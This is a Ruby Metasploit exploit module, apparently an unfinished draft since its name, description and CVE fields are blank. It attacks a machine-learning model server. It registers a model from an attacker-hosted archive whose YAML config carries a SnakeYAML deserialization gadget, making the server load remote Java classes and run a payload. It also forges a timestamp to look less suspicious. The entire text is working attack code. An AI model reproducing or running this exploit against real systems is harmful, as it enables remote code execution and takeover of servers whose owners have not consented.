##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Java
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Java::HTTP::ClassLoader
  # prepend Msf::Exploit::Remote::AutoCheck

  def initialize(_info = {})
    super(
      'Name' => '',
      'Description' => %q{

      },
      'Author' => [
        'Spencer McIntyre'
      ],
      'References' => [
        [ 'CVE', '' ],
      ],
      'DisclosureDate' => '',
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'RPORT' => 8081
      },
      'Targets' => [
        [
          'Automatic', {
            'Platform' => 'java',
            'Arch' => [ARCH_JAVA]
          }
        ],
      ],
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => [REPEATABLE_SESSION]
      }
    )
  end

  def class_name
    'MyScriptEngineFactory'
  end

  def constructor_class
    ::File.binread(::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2022-1471', "#{class_name}.class"))
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    vprint_good("Payload requested by #{cli.peerhost} using #{agent}")

    if request.relative_resource.end_with?('.mar')
      send_response(cli, generate_mar, { 'Content-Type' => 'application/octet-stream' })
      return
    end

    if request.relative_resource.end_with?('services/javax.script.ScriptEngineFactory')
      send_response(cli, class_name, { 'Content-Type' => 'application/octet-string' })
      return
    end

    super(cli, request)
  end

  def generate_mar
    config_file = rand_text_alphanumeric(rand(8..15)) + '.yml'
    serialized_file = rand_text_alphanumeric(rand(8..15)) + '.pt'

    mri = Rex::Zip::Archive.new
    mri.add_file(serialized_file, '')  # an empty data file is sufficient for exploitation
    mri.add_file('MAR-INF/MANIFEST.json', JSON.generate({
      'createdOn' => (Time.now - (600 + Random.rand(600))).strftime('%d/%m/%Y %H:%M:%S'),  # forge a timestamp of 10-20 minutes ago
      'runtime' => 'python',
      'model' => {
        'modelName' => @model_name,
        'serializedFile' => serialized_file,
        'handler' => %w[ image_classifier object_detector text_classifier image_segmenter ].sample,
        'modelVersion' => '1.0',
        'configFile' => config_file
      },
      'archiverVersion' => '0.8.2'
    }))
    mri.add_file(config_file, %( !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["#{get_uri}/"]]]] ))
    mri.pack
  end

  def exploit
    start_service

    @model_name = rand_text_alphanumeric(rand(8..15))
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'models'),
      'vars_get' => { # *must* be vars_get and not vars_post!
        'url' => "#{get_uri}#{@model_name}.mar"
      }
    })

    handler
  end

  def cleanup
    super

    send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'models', @model_name, '1.0')
    })
  end
end
